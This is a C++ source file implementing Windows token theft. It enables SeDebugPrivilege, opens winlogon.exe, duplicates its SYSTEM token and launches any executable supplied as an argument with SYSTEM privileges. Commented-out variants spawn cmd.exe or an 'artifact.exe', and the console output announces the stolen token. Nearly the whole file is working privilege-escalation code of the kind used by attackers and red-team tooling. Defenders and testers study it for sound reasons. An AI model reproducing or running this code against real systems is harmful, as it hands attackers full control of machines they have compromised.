#include "TokenSteal.h"

#pragma comment(lib,"Advapi32.lib")

namespace RAII
{
	Handle::Handle(HANDLE inputHandle)
	{
		_internalHandle = inputHandle;
	}

	Handle::~Handle()
	{
		::CloseHandle(_internalHandle);
	}

	HANDLE Handle::GetHandle()
	{
		return _internalHandle;
	}
}

namespace RAII
{
	Hmodule::Hmodule(HMODULE inputHmodule)
	{
		_internalHmodule = inputHmodule;
	}

	Hmodule::~Hmodule()
	{
		::FreeLibrary(_internalHmodule);
	}

	HMODULE Hmodule::GetHmodule()
	{
		return _internalHmodule;
	}
}

void Error(_In_ DWORD lastError)
{
	wchar_t buf[256];
	FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, lastError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		buf, (sizeof(buf) / sizeof(wchar_t)), NULL);

	std::wcout << "[-] Error code: 0x" << std::hex << lastError << L". Error string: " << buf;
}

DWORD FindPid(_In_ std::wstring imageName)
{

	// create snapshot of processes using RAII classes
	RAII::Handle snapshot(
		CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL)
	);

	if (!snapshot.GetHandle())
	{
		Error(::GetLastError());
		return ERROR_FILE_NOT_FOUND;
	}

	PROCESSENTRY32W processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32W);
	auto status = Process32FirstW(snapshot.GetHandle(), &processEntry); // start enumerating from the first process
	if (!status)
	{
		Error(::GetLastError());
		return ERROR_FILE_NOT_FOUND;
	}

	do
	{
		std::wstring processImage = processEntry.szExeFile;
		std::transform(processImage.begin(), processImage.end(), processImage.begin(), towlower);
		if (processImage == imageName)
		{
			std::wcout << L"[+] Found process " << processEntry.szExeFile << " with PID " << processEntry.th32ProcessID << std::endl; // when lsass is found return its PID to the caller
			return processEntry.th32ProcessID;
		}
	} while (Process32NextW(snapshot.GetHandle(), &processEntry));

	return ERROR_FILE_NOT_FOUND;
}

BOOL SePrivTokenrivilege(
	HANDLE hToken,
	LPCTSTR lpszPrivilege,
	BOOL bEnablePrivilege
)
{
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,
		lpszPrivilege,
		&luid))
	{
		return FALSE;
	}

	TOKEN_PRIVILEGES PrivToken;
	PrivToken.PrivilegeCount = 1;
	PrivToken.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		PrivToken.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		PrivToken.Privileges[0].Attributes = 0;


	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&PrivToken,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		return FALSE;
	}

	return TRUE;
}

int TokenSteal(char* arg, char* arg2)
{
	char* secret = arg;
	char* secret2 = arg2;
	
	HANDLE hCurrentToken = NULL;
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hCurrentToken);
	SePrivTokenrivilege(hCurrentToken, L"SeDebugPrivilege", TRUE);

	// open a handle to winlogon.exe (assign the HANDLE to a RAII type - defined in raii.h - so that CloseHandle is always called)
	RAII::Handle winlogonHandle(::OpenProcess(PROCESS_ALL_ACCESS, false, FindPid(L"winlogon.exe")));
	if (winlogonHandle.GetHandle() == NULL)
	{
		std::cout << "[-] Could not get a handle to winlogon.exe" << std::endl;
		Error(::GetLastError());
		return 1;
	}
	else std::cout << "[+] Opened handle to winlogon.exe: 0x" << winlogonHandle.GetHandle() << std::endl;

	// open a handle to winlogon's token
	HANDLE systemToken;
	BOOL success = ::OpenProcessToken(winlogonHandle.GetHandle(), TOKEN_DUPLICATE, &systemToken);
	RAII::Handle hSystemToken(systemToken); // assigning the HANDLE obtained through OpenProcessToken() to a RAII type
	if (!success)
	{
		std::cout << "[-] Could not get SYSTEM token. " << std::endl;
		::Error(::GetLastError());
		return 1;
	}
	else std::cout << "[+] Stolen SYSTEM token!" << std::endl;

	// create a new token and duplicate winlogon's token inside it
	HANDLE newSystemToken = NULL;
	success = ::DuplicateTokenEx
	(
		hSystemToken.GetHandle(),
		TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
		nullptr,
		SecurityImpersonation,
		TokenPrimary,
		&newSystemToken
	);
	RAII::Handle hNewSystemToken(newSystemToken);
	if (!success)
	{
		std::cout << "[-] Failed to call DuplicateTokenEx() on the stolen token. " << std::endl;
		::Error(::GetLastError());
		return 1;
	}
	else std::cout << "[+] SYSTEM token successfully duplicated!" << std::endl;

	// spawn taskmgr.exe using the newly duplicated SYSTEM token
	STARTUPINFO si = { sizeof(si) }; // startup info structure, used to specify custom configurations for the process
	PROCESS_INFORMATION pi; // process information structure that will hold HANDLEs to the child process/thread

	bstr_t b(secret);
	wchar_t* x = b;
	bstr_t b2(secret2);
	wchar_t* x2 = b2;

	success = ::CreateProcessWithTokenW
	(
		hNewSystemToken.GetHandle(), // get the handle to the duplicated SYSTEM token
		NULL,
		x, // executable name/path
		x2, // arguments to the executable (we don't have them)
		NULL,
		nullptr,
		nullptr,
		&si,
		&pi
	);/*

	success = ::CreateProcessAsUserA(
		 hNewSystemToken.GetHandle(),
		 (LPCSTR)L"cmd.exe",
		 nullptr,
		 NULL,
		 NULL,
		 NULL,
		 NULL,
		 NULL,
		 NULL,
		 (LPSTARTUPINFOA)&si,
		 &pi
	);*/
	/*
	success = ::CreateProcessAsUser(hNewSystemToken.GetHandle(),                // user token
		(LPWSTR)"C:\\Users\\admin\\Desktop\\artifact.exe",                           // app name
		NULL,                   // command line
		0,                           // process attributes
		0,                           // thread attributes
		FALSE,                       // don't inherit handles
		DETACHED_PROCESS,            // flags
		0,                           // environment block
		0,                           // current dir
		&si,                         // startup info
		&pi);*/
	if (!success)
	{
		std::wcout << L"[-] Failed to spawn " << x << L" running as SYSTEM. " << std::endl;
		::Error(::GetLastError());
		return 1;
	}
	else std::wcout << L"[+] Spawned " << x << L" running as SYSTEM!" << std::endl;

	// close the HANDLEs obtained with CreateProcessWithTokenW() which were not assigned to a RAII type variable
	::CloseHandle(pi.hProcess);
	::CloseHandle(pi.hThread);

	return 0;
}